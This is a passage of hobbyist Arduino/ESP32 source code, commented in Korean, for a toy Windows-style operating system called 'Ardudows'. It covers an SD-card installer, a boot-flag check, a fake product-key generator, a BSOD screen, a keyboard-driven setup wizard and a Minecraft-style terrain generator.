  CreateFile("/Ardudows/Programs/Programs_X16/CMD/CMD.apf", "===CMD===");
  Loading();
  CreateFile("/Ardudows/Programs/Programs_X16/NotePad/NotePad.apf", "===NotePad===");
  Loading();
  CreateFile("/Ardudows/Programs/Programs_X16/Calculators/Calculators.apf", "===Calculators===");
  Loading();
  CreateFile("/Ardudows/Programs/Programs_X16/Clock/Clock.apf", "===Clock===");
  Loading();
  CreateFile("/Ardudows/Programs/Programs_X32/Minecraft_Server/server.asf", "===Server config===");
  Loading();
  CreateFile("/Ardudows/Licens/Product.alf", "");
  Loading();
  File user = SD.open("/Ardudows/Users/Administrator/UserDATA.auf", FILE_WRITE);
  user.println("Account Created.");
  user.println("Ardudows Version 1.0");
  user.close();
  File f = SD.open("/Ardudows/System/install.aif", FILE_WRITE);
  f.println("install=true");
  f.close();
  Registry_Set("Setup", "AUICComplete", "0");
  Registry_Save();
  tft.print("\ncompleat! restart pleas.");
  //ESP.restart();
};

// 📡 [SYSTEM FUNCTION] 화면 뚫음 방지 오토 플러시가 탑재된 파일 전수 조사

// 📁 [커널 내부 서브 함수] 하위 폴더까지 무한으로 파고드는 재귀 탐색 엔진
void printDirectory(File dir) {
  tft.setTextSize(1);
  File targetFile = dir.openNextFile();

  while (targetFile) {
    if (targetFile.isDirectory()) {
      // 📂 폴더를 발견하면? "야, 한 단계 더 파고들어!" (재귀 호출)
      printDirectory(targetFile);
    } else {
      // 📄 진짜 파일을 발견하면? 전수조사 및 화면 출력 시퀀스 가동
      totalInspectedFiles++;

      // 🚨 [화면 세로 뚫음 방지 가드] 여유 있게 3줄 남았을 때 미리 리셋 터트리기
      if (currentLineCount >= (maxLines - 2)) {
        tft.fillScreen(0x0000);   // 화면 밀기
        tft.setCursor(0, 0);     

        tft.setTextColor(0xFFE0); // 노란색으로 페이지 가이드 출력
        tft.print(">> CONTINUING DUMP... (PAGE ");
        tft.print((totalInspectedFiles / 2) + 1);
        tft.println(")");
        tft.setTextColor(0x07E0); // 다시 마초 초록색 복구
        tft.println("--------------------------------");

        currentLineCount = 2;     // 라인 카운트 리셋
      }

      // 📺 1. 파일 이름 출력 (경로를 포함한 전체 이름 획득)
      tft.print("["); tft.print(totalInspectedFiles); tft.print("] ");
      tft.println(targetFile.name());
      currentLineCount++;

      // 📺 2. 내용물 덤프 출력 (★가로 화면 탈출 가드 탑재)
      tft.print(" -> VALUE: ");
      tft.setTextColor(0xFFFF); // 내용물은 찐 백색
      
      int charCount = 11; // " -> VALUE: " 가 차지하는 대략적인 글자수 자석 고정

      if (targetFile.available()) {
        while (targetFile.available()) {
          char c = targetFile.read();
          tft.write(c);
          charCount++;

          // 가로 폭이 넘쳐서 강제 줄바꿈이 일어날 때를 완벽 감지!
          if (charCount >= maxCharsPerLine || c == '\n') {
            currentLineCount++;   // 실제 소비된 세로 줄 수 동기화
            charCount = 0;        // 가로 카운트 리셋
          }
        }
      } else {
        tft.print("[EMPTY]");
      }

      tft.setTextColor(0x07E0);
      tft.println(); // 개행
      tft.println("- - - - - - - - - - - - - - - -"); // 구분을 위한 점선
      currentLineCount += 2; // 개행과 점선으로 인해 2줄 추가 누적
    }

    targetFile.close();
    targetFile = dir.openNextFile(); // 다음 대상 자진출두
  }
  tft.setTextSize(2);
}

// =========================================================================
// 👑 [MAIN KERNEL FUNCTION] 아두도스 파일 시스템 검증 메인 함수
// =========================================================================
void File_Check() {
  // 🔑 [KERNEL SECURITY] 부팅 시퀀스 파일 유효성 검증
  tft.setTextColor(0x07E0); // 터미널 초록색
  tft.println(">> VERIFYING BOOT SEQUENCE STATUS...");

  File bootFile = SD.open("/Ardudows/System/Boot/Boot_Sequence.asf", FILE_READ);

  String bootStatus = "";
  while (bootFile.available()) {
    bootStatus += (char)bootFile.read();
  }
  bootFile.close();

  // 공백 제거로 정밀 가드
  bootStatus.trim(); 

  // 🚨 파일 안의 내용이 "boot=true"가 아니면 무조건 컷!
  if (bootStatus != "boot=true") {
    tft.fillScreen(0x0000);
    tft.setCursor(0, 0);
    tft.setTextColor(0xF800); // 보안 위반 빨간색 포스
    tft.println("========================================");
    tft.println("            SECURITY VIOLATION          ");
    tft.println("========================================");
    tft.print("CURRENT FLAG : "); tft.println(bootStatus);
    tft.println("BOOT ACCESS  : DENIED (boot=false)");
    tft.println("KERNEL CORE  : LOCKED.");
    tft.println("----------------------------------------");
    tft.println(">> SYSTEM HALTED BY ,Administrator CONTROL.");
  
    // ⚡ 칩셋 하드웨어 가상 셧다운: CPU 듀얼 코어를 완전 락업 걸어버리기
    while(1) {
      // 뇌 빼고 락 걸기
    }
  }

  // 🎉 파일이 존재하고 "boot=true"일 때만 통과!
  tft.println(">> ACCESS GRANTED. KERNEL BOOT SUCCESS.");
  tft.println("----------------------------------------");

  // 🧹 메인 화면 전환 및 카운터 초기화
  tft.fillScreen(0x0000);   
  tft.setCursor(0, 0);     
  
  tft.println(">> INITIATING COMPACT REGISTRY DUMP...");
  tft.println("--------------------------------");

  // 📁 탐색할 대상 타깃 루트 디렉터리 설정
  File rootDir = SD.open("/Ardudows/System/ImpoSystem");

  if (!rootDir) {
    tft.setTextColor(0xF800);
    tft.println("[CRITICAL ERROR] UNABLE TO OPEN DIR!");
    return;
  }

  // 🔄 전수조사 구동 전 카운터 정밀 세팅
  currentLineCount = 2; 
  totalInspectedFiles = 0;

  // 🔥 [하이라이트] 루트 폴더를 재귀 엔진에 던져서 하위 폴더까지 싹 다 털어버리기!
  printDirectory(rootDir);

  rootDir.close();

  // 🏁 전수 조사 최종 완료 보고
  tft.fillScreen(0x0000);
  tft.setCursor(0, 0);
  tft.setTextColor(0xFFE0); 
  tft.println(">> INTEGRITY CHECK COMPLETE.");
  tft.println("--------------------------------");
  tft.print(">> TOTAL VERIFIED: "); 
  tft.print(totalInspectedFiles); tft.println(" REGS.");
  tft.setTextColor(0x07E0); // 프롬프트 복구용 세팅
}

//===이 모든 것의 원흉 ArduBios===
void ArduBios() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.println("Ardudows BIOS");
  tft.println("----------------");
  delay(1000);
  File_Check();
  //ATT();
  delay(400);
  //Check();
  //하하
  Firmware_Information();

  switch (bootState) {

    case BOOT_RECOVERY:
      tft.println("Mode: Recovery");
      RecoveryMode();
      break;

    case BOOT_INSTALL:
      tft.println("Mode: Install");
      ArduInstall_Screen();
      break;

    case BOOT_AUIC:
      tft.println("Mode: AUIC");
      //AUIC();
      break;

    case BOOT_KERNEL:
      tft.println("Booting Kernel...");
      // Kernel_Start();
      break;
  }
}

//===바이오스 정보창===
void Firmware_Information() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.print("Ardu");
  tft.print(Firmware);
  tft.print(" ver : ");
  tft.print(ver);
  tft.print("\n");
  tft.print("ATT : Null");
  //tft.print(Registry_Get_Touch() ? "true" : "false");
  tft.print("\n");
  if (!SD_OK) {
    tft.print("Sorry. Not SD.\n");
    tft.print("Check now\n\n");
    tft.print("1. SD format is FAT32?\n");
    tft.print("2. insert SD?\n");
    tft.print("3. this software upload?\n");
    tft.print("or reboot pleas.");
  }
  tft.println(install ? "installed? = true" : "installed? = false");
  //이거 만드는데 고생함...
  tft.println("pleas insert SD...");
  delay(300);
  //Check();
  //예!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  make_ProductKey(PRODUCT_KEY);

  SD_Check();
  //파일 경로 대충 만들기
  SD.mkdir("/Ardudows");
  SD.mkdir("/Ardudows/System");

  File Product_Key = SD.open("/Ardudows/Licens/Product.alf", FILE_WRITE);
  Product_Key.println("Do not disclose to others!!!");
  Product_Key.print("Product key=");
  Product_Key.println(PRODUCT_KEY);
  Product_Key.close();
  delay(3000);

  //delay(2000);
  //Check();
};

void ArduInstall_Screen() {

  if (installDrawn) return;

  tft.fillScreen(TFT_BLUE);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(0, 0);
  tft.setTextSize(2);

  tft.print("installing...");
  ArduInstaller();
}

//===프로덕트 키 생성기(난 프로덕트 키 스킵 안해주는 윈도우 95,98이 밉다)===
void make_ProductKey(char* out) {
  int idx = 0;

  for (int i = 0; i < 25; i++) {
    uint32_t r = esp_random();
    out[idx++] = KEYSET[r % 36];

    if ((i + 1) % 5 == 0 && i != 24) {
      out[idx++] = '-';
    }
  }
  out[idx] = '\0';
}

//===BSOD===
void BSOD() {
  tft.fillScreen(TFT_BLUE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(5);
  tft.setCursor(20, 30);
  tft.print(":(");

  tft.setTextSize(1);
  tft.setCursor(20, 80);
  tft.print("Your PC ran into a problem");

  tft.setCursor(20, 100);
  tft.print("and needs to restart.");

  tft.setCursor(20, 120);
  tft.print("We're collecting error info,");

  tft.setCursor(20, 140);
  tft.print("and will restart automatically.");

  tft.setTextSize(2);
  tft.setCursor(20, 180);
  tft.print("ERROR_CODE: ");
  tft.print(AEC);
  //Ardudows Error Code (AEC)

  tft.setTextSize(1);
  tft.setCursor(20, 200);
  tft.print("For more information about");

  tft.setCursor(20, 220);
  tft.print("this issue and possible fixes, see.");
}

//===AUIC===
//개발중
//터치를 어케하지 지옥이다
//터치로부터 해방이다ㅏㅏㅏㅏㅏㅏ
void AUIC() {

  if (!auicDrawn) {

    tft.fillScreen(TFT_WHITE);
    tft.setTextColor(TFT_BLACK, TFT_WHITE);
    tft.setCursor(0, 0);

    tft.setTextSize(3);
    tft.println("AUIC_Core\n");

    tft.setTextSize(2);

    tft.println("1. Language");
    tft.println("2. Username");
    tft.println("3. Country");
    tft.println("4. Authority");
    tft.println("5. Workgroup");
    tft.println("6. Computer Name");
    tft.println("7. Install");

    auicDrawn = true;
  }

  // 커서 표시
  tft.setTextSize(2);
  tft.setCursor(0, 80 + auicCursor * 16);
  tft.print(">");
}

void AUIC_Next() {
  if (auicStep < AUIC_DONE) {
    auicStep = (AUIC_STEP)(auicStep + 1);
    auicDrawn = false;
  }
}

// 현재 단계에 따라 editBuffer를 실제 변수에 저장
void AUIC_SaveCurrentField() {
  switch (auicStep) {
    case AUIC_USERNAME:
      auicUsername = auicEditBuffer;
      break;

    case AUIC_PASSWORD:
      auicPassword = auicEditBuffer;
      break;

    case AUIC_WORKGROUP:
      auicWorkgroup = auicEditBuffer;
      break;

    case AUIC_COMPUTER:
      auicComputerName = auicEditBuffer;
      break;
  }
}

void AUIC_LoadCurrentField() {
  switch (auicStep) {
    case AUIC_USERNAME:
      auicEditBuffer = auicUsername;
      break;

    case AUIC_PASSWORD:
      auicEditBuffer = auicPassword;
      break;

    case AUIC_WORKGROUP:
      auicEditBuffer = auicWorkgroup;
      break;

    case AUIC_COMPUTER:
      auicEditBuffer = auicComputerName;
      break;

    default:
      auicEditBuffer = "";
      break;
  }
}



void AUIC_Back() {
  if (auicStep > AUIC_WELCOME) {
    auicStep = (AUIC_STEP)(auicStep - 1);
    auicDrawn = false;
  }
}

void AUIC_OK() {
  if (auicEditing) {
    switch (auicStep) {
      case AUIC_USERNAME:
        auicUsername = auicEditBuffer;
        break;

      case AUIC_PASSWORD:
        auicPassword = auicEditBuffer;
        break;

      case AUIC_COMPUTER:
        auicComputerName = auicEditBuffer;
        break;
    }

    auicEditing = false;
    auicEditBuffer = "";

    AUIC_Next();
  } else {
    auicEditing = true;
    auicEditBuffer = "";
  }

  auicDrawn = false;
}

void AUIC_HandleInput() {
  uint8_t key = ps2Keyboard_adf();

  if (key == KEY_NONE)
    return;


  switch (key) {
    case KEY_F1:
      AUIC_Back();
      break;


    case KEY_F2:
      AUIC_Next();
      break;


    case KEY_ENTER:
      AUIC_OK();
      break;


    case KEY_BACKSPACE:

      if (auicEditing && auicEditBuffer.length() > 0) {
        auicEditBuffer.remove(auicEditBuffer.length() - 1);
        auicDrawn = false;
      }

      break;


    default:

      if (auicEditing && key < 128) {
        char c;

        if (shiftPressed)
          c = shift_keymap[key];
        else
          c = keymap[key];

        if (c != 0) {
          auicEditBuffer += c;
          auicDrawn = false;
        }
      }

      break;
  }
}

void AUIC_Draw() {
  // =========================
  // 전체 배경
  // =========================
  tft.fillScreen(TFT_WHITE);

  // =========================
  // Header
  // =========================
  tft.fillRect(0, 0, 480, 60, TFT_BLUE);

  tft.setTextColor(TFT_WHITE, TFT_BLUE);
  tft.setCursor(20, 18);
  tft.setTextSize(3);
  tft.print("Ardudows Setup");


  // =========================
  // Step 표시
  // =========================
  tft.setTextColor(TFT_BLACK, TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(20, 75);

  if (auicStep < AUIC_DONE) {
    tft.print("Step ");
    tft.print((int)auicStep + 1);
    tft.print(" / ");
    tft.print((int)AUIC_DONE);
  }


  // =========================
  // 카드 영역
  // =========================
  tft.fillRect(20, 110, 440, 160, TFT_LIGHTGREY);
  tft.drawRect(20, 110, 440, 160, TFT_DARKGREY);


  tft.setTextColor(TFT_BLACK, TFT_LIGHTGREY);
  tft.setCursor(40, 135);
  tft.setTextSize(3);


  // =========================
  // STEP 내용
  // =========================
  switch (auicStep) {

    case AUIC_WELCOME:

      tft.print("Welcome");

      tft.setTextSize(2);
      tft.setCursor(40, 180);
      tft.print("Welcome to Ardudows");

      break;


    case AUIC_LANGUAGE:

      tft.print("Language");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicLang.length() == 0)
        tft.print("_");
      else
        tft.print(auicLang);

      break;


    case AUIC_USERNAME:

      tft.print("Username");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicUsername.length() == 0)
        tft.print("_");
      else
        tft.print(auicUsername);

      break;


    case AUIC_COUNTRY:

      tft.print("Country");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicCountry.length() == 0)
        tft.print("_");
      else
        tft.print(auicCountry);

      break;


    case AUIC_AUTHORITY:

      tft.print("Authority");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicAuthority.length() == 0)
        tft.print("_");
      else
        tft.print(auicAuthority);

      break;


    case AUIC_PASSWORD:

      tft.print("Password");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicPassword.length() == 0) {
        tft.print("_");
      } else {
        for (int i = 0; i < auicPassword.length(); i++)
          tft.print("*");
      }

      break;


    case AUIC_WORKGROUP:

      tft.print("Workgroup");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicWorkgroup.length() == 0)
        tft.print("_");
      else
        tft.print(auicWorkgroup);

      break;


    case AUIC_COMPUTER:

      tft.print("Computer Name");

      tft.setTextSize(2);
      tft.setCursor(40, 180);

      if (auicComputerName.length() == 0)
        tft.print("_");
      else
        tft.print(auicComputerName);

      break;


    case AUIC_SUMMARY:

      tft.print("Summary");

      tft.setTextSize(2);

      tft.setCursor(40, 170);
      tft.print("User: ");
      tft.print(auicUsername);

      tft.setCursor(40, 190);
      tft.print("PC: ");
      tft.print(auicComputerName);

      tft.setCursor(40, 210);
      tft.print("Lang: ");
      tft.print(auicLang);

      tft.setCursor(40, 230);
      tft.print("Country: ");
      tft.print(auicCountry);

      break;


    case AUIC_DONE:
      Registry_Set("User", "Name", auicUsername.c_str());
      Registry_Set("User", "Authority", auicAuthority.c_str());
      Registry_Set("System", "Language", auicLang.c_str());
      Registry_Set("System", "Country", auicCountry.c_str());

      Registry_Save();

      tft.print("Done!");

      if (!auicFinished) {
        AUIC_Finish();
        auicFinished = true;
      }

      tft.setTextSize(2);
      tft.setCursor(40, 180);
      tft.print("Reboot please");

      break;
  }



  // =========================
  // Footer
  // =========================
  if (auicStep != AUIC_DONE) {
    tft.fillRect(0, 280, 480, 40, TFT_NAVY);

    tft.setTextColor(TFT_WHITE, TFT_NAVY);
    tft.setCursor(20, 290);
    tft.setTextSize(2);

    tft.print("[F1] Back    ");
    tft.print("[F2] Next    ");
    tft.print("[ENTER] OK");
  }


  // =========================
  // draw 완료 플래그
  // =========================
  auicDrawn = true;
}

void nextStep() {
  if (auicStep < AUIC_DONE)
    auicStep = (AUIC_STEP)(auicStep + 1);
}

void backStep() {
  if (auicStep > AUIC_WELCOME)
    auicStep = (AUIC_STEP)(auicStep - 1);
}

void AUICLoop() {
  if (!auicDrawn)
    AUIC_Draw();

  AUIC_HandleInput();

  if (auicStep == AUIC_DONE) {
    if (ps2Keyboard_adf() == KEY_ENTER) {
      bootState = BOOT_LOGIN;
    }
  }
}

/*
//===ATK용 인스톨러===
void ATK_Installer() {
  //Arduinstaller();
  //위치 찾기용 ㅋㅋㅋ
  SD.mkdir("/Ardudows/System");
  Loading();
  PrintLog("/Ardudows/System");
  SD.mkdir("/Ardudows/System/kernel");
  Loading();
  PrintLog("/Ardudows/System/kernel");
  SD.mkdir("/Ardudows/System/kernel/ATK");
  Loading();
  PrintLog("/Ardudows/System/kernel/ATK");
  SD.mkdir("/Ardudows/System/Registry");
  Loading();
  PrintLog("/Ardudows/System/Registry");
  SD.mkdir("/Ardudows/System/Driver");
  Loading();
  PrintLog("/Ardudows/System/Driver");
  SD.mkdir("/Ardudows/System/Driver/Log");
  Loading();
  PrintLog("/Ardudows/System/Driver/Log");
  SD.mkdir("/Ardudows/System/NetWork");
  Loading();
  PrintLog("/Ardudows/System/NetWork");
  //이곳에 왜 네트워크가 있냐고? ping명령어 있어야 재밌음 그리고 이거 네트워크 테스트할때 이거보다 확실한 방법은 없음ㅋㅋㅋ
  SD.mkdir("/Ardudows/System/Boot");
  Loading();
  PrintLog("/Ardudows/System/Boot");
  SD.mkdir("/Ardudows/Licens");
  Loading();
  PrintLog("/Ardudows/Licens");
  //여기는 앱,사용자 같은 개념이 없음
}
*/

//===다시 그리기===
void RedrawATK() {

  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);

  int linesPerScreen = 20;  // 폰트 크기에 맞게 조절

  for (int i = 0; i < linesPerScreen; i++) {

    int index = i + scrollOffset;

    if (index < totalLines) {
      tft.println(screenBuffer[index]);
    }
  }
}

//===메뉴 그리기===
void DrawMenu() {

  tft.fillRect(0, 80, 320, 160, TFT_BLACK);
  // ↑ 메뉴 영역만 지움 (전체 화면 안 지우는 게 깔끔함)

  tft.setTextSize(2);

  for (int i = 0; i < menuCount; i++) {

    tft.setCursor(40, 100 + (i * 30));

    if (i == menuIndex) {
      // 선택된 항목 강조
      tft.setTextColor(TFT_BLACK, TFT_WHITE);
      tft.print("> ");
      tft.print(menuItems[i]);
    } else {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.print("  ");
      tft.print(menuItems[i]);
    }
  }

  // 텍스트 색 원복
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

//===ATK용 출력===
void ATK_Println(String text) {

  if (totalLines < MAX_LINES) {
    screenBuffer[totalLines++] = text;
  } else {
    // 밀어내기
    for (int i = 1; i < MAX_LINES; i++)
      screenBuffer[i - 1] = screenBuffer[i];

    screenBuffer[MAX_LINES - 1] = text;
  }

  RedrawATK();
}

//===엔터 눌렀을때===
void HandleAUICEnter() {

  if (auicStage == AUIC_MENU) {

    if (menuIndex == 0) {
      // Username 입력 모드로 진입
      auicStage = AUIC_USERNAME_INPUT;

      inputBuffer = "";

      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0, 0);
      tft.println("Create User");
      tft.println();
      tft.print("Username: ");
    }

    else if (menuIndex == 1) {
      bootState = BOOT_KERNEL;
      atkStarted = false;
    }

    else if (menuIndex == 2) {
      tft.println("Exiting...");
    }
  }

  else if (auicStage == AUIC_USERNAME_INPUT) {

    if (inputBuffer.length() > 0) {

      String newUser = inputBuffer;

      // 🔥 여기서 실제 사용자 이름 저장 처리
      RenameUserFolder(newUser);

      inputBuffer = "";

      auicStage = AUIC_MENU;
      auicDrawn = false;  // 메뉴 다시 그리게
    }
  }
}

char Keyboard_GetKey() {
  uint8_t code = ps2Keyboard_adf();

  if (code != KEY_NONE)
    lastKey = code;

  uint8_t key = lastKey;
  lastKey = KEY_NONE;

  return key;
}

//===마인크래프트 서버===

Chunk globalChunk;

// ===============================
// 221 Terrain Generator
// Vertical Layer System
// ESP32-S3 optimized
// ===============================


int currentLogLine = 0;
const int maxLogLines = 14;
uint8_t chunkBuffer[13000];  // 청크 전송용 고정 메모리 (파편화 방지)


// 2. 블록 ID 정의 (전역)
#define AIR 0
#define STONE 1
#define GRASS 2
#define DIRT 3
#define BEDROCK 7
#define WATER 9
#define GRAVEL 13
#define IRON_ORE 15
#define WOOD 17
#define LEAVES 18
#define TNT 46
#define CHEST 54
#define DIAMOND_ORE 56
#define WHEAT 59
#define SNOW 78
#define OAK_FENCE 85
#define PORTAL 120
#define EMERALD_ORE 129

#define WORLD_HEIGHT 128
#define CHUNK_SIZE 16
#define MAX_SECTIONS 8  // 128 / 16 = 8개 섹션
// [에러 해결 1] 버퍼 형제들 선언
//uint8_t lightBuffer[2048];  // 블록 빛 데이터용
//uint8_t skyBuffer[2048];    // 하늘 빛 데이터용

// ===============================
// 메인 월드 생성 함수
// ===============================

void generate221Chunk(Chunk& chunk) {

  // 🚀 [수정] fastRandom 시드 확보
  uint32_t r = fastRandom(chunk.x, chunk.z);

  // 🚀 [수정] 이미 부모 함수에서 지형을 생성했으므로,
  // 여기서는 '구조물'과 '특수 지형'만 덧씌웁니다. (리부트 방지 핵심)
  int baseHeight = 4 + (r % 3);
  int biome = r % 100;

  // 바이옴 판정
  bool isForest = biome < 15;
  bool isFarm = biome >= 15 && biome < 30;
  bool isMinefield = biome >= 30 && biome < 40;
  bool isDenseGrass = biome >= 40 && biome < 50;
  // =========================
  // 1. 숲 생성 (범위 체크 및 16층 제한)
  // =========================
  if (isForest) {
    int treeCount = 2 + (r % 3);
    for (int t = 0; t < treeCount; t++) {
      // 테두리에서 떨어진 안전한 곳에 나무 생성 (인덱스 초과 방지)
      int tx = fastRandom(t, chunk.x) % (CHUNK_SIZE - 4) + 2;
      int tz = fastRandom(t, chunk.z) % (CHUNK_SIZE - 4) + 2;
      // generate221Chunk 내부의 'ty' 설정 부분 수정 예시
      int ty = getHeight128(chunk.x * 128 + tx, chunk.z * 128 + tz) + 1;
      // ty가 현재 섹션(startY ~ startY+15) 범위 안에 있을 때만 그려야 에러가 안 납니다!


      // 나무 기둥
      for (int i = 0; i < 4; i++) {
        if (ty + i < 16) chunk.blocks[tx][tz][ty + i] = WOOD;
      }

      // 나뭇잎 (범위 밖으로 나가지 않게 min/max 조절)
      for (int lx = -1; lx <= 1; lx++)
        for (int lz = -1; lz <= 1; lz++)
          for (int ly = 2; ly <= 3; ly++) {
            if (ty + ly < 16) {
              chunk.blocks[tx + lx][tz + lz][ty + ly] = LEAVES;
            }
          }
    }
  }

  // =========================
  // 2. 논밭 생성 (WHEAT)
  // =========================
  if (isFarm && (baseHeight + 1 < 16)) {
    for (int x = 0; x < CHUNK_SIZE; x++)
      for (int z = 0; z < CHUNK_SIZE; z++) {
        chunk.blocks[x][z][baseHeight + 1] = WHEAT;
      }
  }

  // =========================
  // 3. 엄폐 잔디 (LEAVES 활용)
  // =========================
  if (isDenseGrass && (baseHeight + 1 < 16)) {
    for (int i = 0; i < 15; i++) {
      int gx = fastRandom(i, chunk.x) % CHUNK_SIZE;
      int gz = fastRandom(i, chunk.z) % CHUNK_SIZE;
      chunk.blocks[gx][gz][baseHeight + 1] = LEAVES;
    }
  }

  // =========================
  // 4. 마을 생성 (안전 좌표 로직)
  // =========================
  if (biome > 85 && biome < 95) {  // 10% 확률로 마을
    int hx = fastRandom(r, chunk.x) % (CHUNK_SIZE - 5);
    int hz = fastRandom(r, chunk.z) % (CHUNK_SIZE - 5);

    for (int x = 0; x < 4; x++)
      for (int z = 0; z < 4; z++)
        for (int y = 0; y < 3; y++) {
          if (baseHeight + y < 16) {
            chunk.blocks[hx + x][hz + z][baseHeight + y] = (y == 2) ? LEAVES : WOOD;
          }
        }
  }

  // =========================
  // 5. 0.5 청크 섬 (221 서버 랜드마크)
  // =========================
  if ((chunk.x == 0 && chunk.z == 0) || (chunk.x == 5 && chunk.z == -3)) {
    for (int x = 0; x < CHUNK_SIZE; x++)
      for (int z = 0; z < CHUNK_SIZE; z++) {
        if (x < 8) {  // 공급 구역
          chunk.blocks[x][z][baseHeight] = STONE;
          if (x == 4 && z == 8 && baseHeight + 1 < 16)
            chunk.blocks[x][z][baseHeight + 1] = CHEST;
        } else {  // 포탈 구역
          chunk.blocks[x][z][baseHeight] = STONE;
          if (x == 12 && z == 8 && baseHeight + 1 < 16)
            chunk.blocks[x][z][baseHeight + 1] = PORTAL;
        }
      }
  }

  // =========================
  // 6. 지뢰밭 (TNT) - 울타리 포함
  // =========================
  if (isMinefield && (baseHeight + 1 < 16)) {
    // 테두리 울타리
    for (int i = 0; i < CHUNK_SIZE; i++) {
      chunk.blocks[i][0][baseHeight + 1] = OAK_FENCE;
      chunk.blocks[i][15][baseHeight + 1] = OAK_FENCE;
      chunk.blocks[0][i][baseHeight + 1] = OAK_FENCE;
      chunk.blocks[15][i][baseHeight + 1] = OAK_FENCE;
    }
    // 지뢰 매설
    for (int i = 0; i < 6; i++) {
      int mx = fastRandom(i, chunk.x) % 14 + 1;
      int mz = fastRandom(i, chunk.z) % 14 + 1;
      chunk.blocks[mx][mz][baseHeight] = TNT;  // 발판 바로 밑에 매설
    }
  }

  // =========================
  // 7. 물 웅덩이
  // =========================
  if (biome > 95 && (baseHeight < 16)) {
    for (int x = 0; x < CHUNK_SIZE; x++)
      for (int z = 0; z < CHUNK_SIZE; z++) {
        chunk.blocks[x][z][baseHeight] = WATER;
      }
  }
}

// --- [전역 설정 변수 및 상태] ---
int world_chunk_size = 3;
int world_chunk_count = 5;
String world_type = "flat";
String world_name = "my_world";
int max_players = 3;
bool ardudows_control = true;
bool chatting_enabled = true;
int online_players = 0;

// deterministic random
uint32_t terrainSeed = 221;

uint32_t terrainRandom(int x, int z) {
  uint32_t n = x * 374761393 + z * 668265263;
  n = (n ^ (n >> 13)) * 1274126177;
  return n ^ terrainSeed;
}


// height noise generator
// 1. 두 지점 사이를 부드럽게 이어주는 함수 (코사인 보간)
float interpolate(float a, float b, float x) {
  float ft = x * 3.1415927f;
  float f = (1 - cos(ft)) * 0.5f;
  return a * (1 - f) + b * f;
}

// 2. 특정 격자 지점의 노이즈 값을 가져오는 보조 함수
float getNoise(int x, int z) {
  uint32_t r = terrainRandom(x, z);
  return (float)(r % 100) / 100.0f;  // 0.0 ~ 1.0 사이 값 반환
}

// 3. [전체 수정] 부드러운 높이 생성 함수
int getHeight(int worldX, int worldZ) {
  // 🔍 주파수 조절 (값이 클수록 지형이 완만해집니다)
  // 16으로 나누면 16블록마다 새로운 큰 굴곡이 생깁니다.
  int freq = 16;

  int x0 = (worldX >= 0) ? (worldX / freq) : (worldX / freq - 1);
  int z0 = (worldZ >= 0) ? (worldZ / freq) : (worldZ / freq - 1);
  int x1 = x0 + 1;
  int z1 = z0 + 1;

  // 네 모서리의 랜덤 높이값 가져오기
  float v00 = getNoise(x0, z0);
  float v10 = getNoise(x1, z0);
  float v01 = getNoise(x0, z1);
  float v11 = getNoise(x1, z1);

  // 현재 위치가 격자 내에서 어디쯤인지 (0.0 ~ 1.0)
  float tx = (float)(worldX - (x0 * freq)) / freq;
  float tz = (float)(worldZ - (z0 * freq)) / freq;

  // X축 보간
  float i1 = interpolate(v00, v10, tx);
  float i2 = interpolate(v01, v11, tx);

  // Z축 보간 (최종 노이즈 값)
  float finalNoise = interpolate(i1, i2, tz);

  // 기본 높이 5층 + 최대 굴곡 8층 = 총 5~13층 사이의 부드러운 지형
  int baseHeight = 5 + (int)(finalNoise * 8);

  // [선택 사항] 5% 확률로 아주 가끔 나타나는 완만한 언덕
  uint32_t r = terrainRandom(worldX, worldZ);
  if ((r % 100) < 5) baseHeight += (r % 4);

  return baseHeight;
}



// mineral generator
uint8_t getMineral(int y, uint32_t rand) {
  if (y < 5) {
    if ((rand % 100) < 8)
      return DIAMOND_ORE;
  }

  if (y < 20) {
    if ((rand % 100) < 12)
      return IRON_ORE;
  }

  if (y > 25) {
    if ((rand % 100) < 3)
      return EMERALD_ORE;
  }

  return STONE;
}



// ===============================
// MAIN TERRAIN GENERATOR
// ===============================
// ===============================
// MAIN TERRAIN GENERATOR (V2.0)
// 메모리 안정성 최적화 완료
// ===============================
/*
void generateTerrain221(int chunkX, int chunkZ) {
  // 🚀 포인트: blocks 배열을 인자로 받지 않고,
  // 전역 변수인 globalChunk의 blocks에 직접 빨대를 꽂습니다.

  for (int x = 0; x < CHUNK_SIZE; x++) {
    for (int z = 0; z < CHUNK_SIZE; z++) {

      int worldX = chunkX * CHUNK_SIZE + x;
      int worldZ = chunkZ * CHUNK_SIZE + z;

      uint32_t rand = terrainRandom(worldX, worldZ);
      int height = getHeight(worldX, worldZ);
      int soilDepth = 2 + (rand % 2);

      for (int y = 0; y < WORLD_HEIGHT; y++) {
        // globalChunk.blocks를 직접 수정하여 스택 복사를 방지합니다.

        // Layer 0: Bedrock
        if (y == 0) {
          globalChunk.blocks[x][z][y] = BEDROCK;
        }
        // Layer 1: Mineral Layer
        else if (y < height - soilDepth) {
          globalChunk.blocks[x][z][y] = getMineral(y, rand + y);
        }
        // Layer 2: Soil Layer
        else if (y < height) {
          if ((rand + y) % 4 == 0)
            globalChunk.blocks[x][z][y] = GRAVEL;
          else
            globalChunk.blocks[x][z][y] = DIRT;
        }
        // Layer 3: Surface
        else if (y == height) {
          if (height > 20)
            globalChunk.blocks[x][z][y] = SNOW;
          else
            globalChunk.blocks[x][z][y] = GRASS;
        }
        // Layer 4: Air
        else {
          globalChunk.blocks[x][z][y] = AIR;
        }
      }
    }
  }
}
*/

// ===============================
// 221 Kernel World Generator
// ESP32-S3 optimized
// ===============================


// 블록 ID 정의 (간단화)
#define AIR 0
#define GRASS 2
